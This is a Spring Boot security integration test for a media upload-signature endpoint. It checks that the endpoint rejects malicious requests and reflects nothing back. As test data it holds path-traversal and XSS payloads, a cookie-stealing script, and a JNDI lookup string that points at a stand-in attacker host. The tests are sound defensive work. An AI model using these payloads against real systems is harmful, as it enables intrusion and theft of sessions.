package com.storyplatform.integration.security;

import com.storyplatform.media.application.UploadSignatureOperations;
import com.storyplatform.shared.api.ApiRequestLimits;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.webmvc.test.autoconfigure.AutoConfigureMockMvc;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.test.context.bean.override.mockito.MockitoBean;
import org.springframework.test.web.servlet.MockMvc;

import java.net.URI;

import static org.mockito.Mockito.verifyNoInteractions;
import static org.springframework.security.test.web.servlet.request
        .SecurityMockMvcRequestPostProcessors.jwt;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders
        .get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders
        .options;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders
        .post;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders
        .request;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers
        .content;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers
        .header;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers
        .jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers
        .status;

@SpringBootTest(properties = {
        "app.media.cloudinary.enabled=true",
        "app.media.cloudinary.cloud-name=test-cloud",
        "app.media.cloudinary.api-key=test-key",
        "app.media.cloudinary.upload-preset=restricted",
        "app.media.cloudinary.root-folder=gioitruyen/security",
        "app.media.cloudinary.signature-ttl=10m"
})
@AutoConfigureMockMvc
class HttpAttackSurfaceIntegrationTest {

    private static final String USER_ID =
            "00000000-0000-4000-8000-000000000001";
    private static final String SIGNATURE_PATH =
            "/media/upload-signatures";

    @Autowired
    private MockMvc mockMvc;

    @MockitoBean
    private UploadSignatureOperations signatures;

    @ParameterizedTest
    @ValueSource(strings = {
            "\"ownerType\":\"USER\","
                    + "\"ownerId\":\"../../admin\","
                    + "\"purpose\":\"AVATAR\","
                    + "\"contentType\":\"image/png\","
                    + "\"sizeBytes\":1,"
                    + "\"sha256\":\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
                    + "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"",
            "\"ownerType\":\"USER\","
                    + "\"ownerId\":\"<script>alert(1)</script>\","
                    + "\"purpose\":\"AVATAR\","
                    + "\"contentType\":\"image/png\","
                    + "\"sizeBytes\":1,"
                    + "\"sha256\":\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
                    + "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"",
            "\"ownerType\":\"USER\","
                    + "\"ownerId\":\"00000000-0000-4000-8000-000000000001\","
                    + "\"purpose\":\"AVATAR\","
                    + "\"contentType\":\"image/svg+xml\","
                    + "\"sizeBytes\":1,"
                    + "\"sha256\":\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
                    + "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\","
                    + "\"unexpected\":\"${jndi:ldap://attacker.invalid/a}\""
    })
    void rejectsInjectionAndUnknownFieldPayloadsBeforeUseCase(
            String fields
    ) throws Exception {
        mockMvc.perform(post(SIGNATURE_PATH)
                        .with(jwt().jwt(token -> token.subject(USER_ID)))
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{" + fields + "}"))
                .andExpect(status().isBadRequest())
                .andExpect(content().contentTypeCompatibleWith(
                        MediaType.APPLICATION_PROBLEM_JSON
                ));

        verifyNoInteractions(signatures);
    }

    @Test
    void rejectsMalformedJsonWithoutReflectingAttackInput()
            throws Exception {
        String attack = "<script>alert(document.cookie)</script>";

        mockMvc.perform(post(SIGNATURE_PATH)
                        .with(jwt().jwt(token -> token.subject(USER_ID)))
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{\"ownerId\":\"" + attack + "\""))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.code").value("MALFORMED_JSON"))
                .andExpect(content().string(
                        org.hamcrest.Matchers.not(
                                org.hamcrest.Matchers.containsString(attack)
                        )
                ));

        verifyNoInteractions(signatures);
    }

    @Test
    void rejectsOversizedChunkedJsonAtTheSharedBoundary()
            throws Exception {
        byte[] oversized =
                new byte[ApiRequestLimits.MAX_REQUEST_BODY_BYTES + 1];
        java.util.Arrays.fill(oversized, (byte) 'a');

        mockMvc.perform(post(SIGNATURE_PATH)
                        .with(jwt().jwt(token -> token.subject(USER_ID)))
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(oversized)
                        .header(HttpHeaders.TRANSFER_ENCODING, "chunked"))
                .andExpect(status().isPayloadTooLarge())
                .andExpect(jsonPath("$.code").value("PAYLOAD_TOO_LARGE"));

        verifyNoInteractions(signatures);
    }

    @Test
    void rejectsUnsupportedMediaTypesAndAnonymousSigning()
            throws Exception {
        mockMvc.perform(post(SIGNATURE_PATH)
                        .with(jwt().jwt(token -> token.subject(USER_ID)))
                        .contentType(MediaType.APPLICATION_XML)
                        .content("<upload><owner>admin</owner></upload>"))
                .andExpect(status().isUnsupportedMediaType());

        mockMvc.perform(post(SIGNATURE_PATH)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content("{}"))
                .andExpect(status().isUnauthorized());

        verifyNoInteractions(signatures);
    }

    @Test
    void hostileCrossOriginPreflightGetsNoCorsGrant()
            throws Exception {
        mockMvc.perform(options(SIGNATURE_PATH)
                        .header(HttpHeaders.ORIGIN, "https://evil.invalid")
                        .header(
                                HttpHeaders.ACCESS_CONTROL_REQUEST_METHOD,
                                "POST"
                ))
                .andExpect(status().isUnauthorized())
                .andExpect(header().doesNotExist(
                        HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN
                ));
    }

    @Test
    void publicResponsesCarryBrowserSecurityHeaders()
            throws Exception {
        mockMvc.perform(get("/actuator/info")
                        .header(HttpHeaders.ORIGIN, "https://evil.invalid"))
                .andExpect(status().isOk())
                .andExpect(header().string(
                        "X-Content-Type-Options",
                        "nosniff"
                ))
                .andExpect(header().string("X-Frame-Options", "DENY"))
                .andExpect(header().doesNotExist(
                        HttpHeaders.ACCESS_CONTROL_ALLOW_ORIGIN
                ));
    }

    @Test
    void traceMethodIsNotExposed() throws Exception {
        mockMvc.perform(request(
                        org.springframework.http.HttpMethod.TRACE,
                        URI.create("/actuator/health")
                ))
                .andExpect(status().isBadRequest());
    }
}
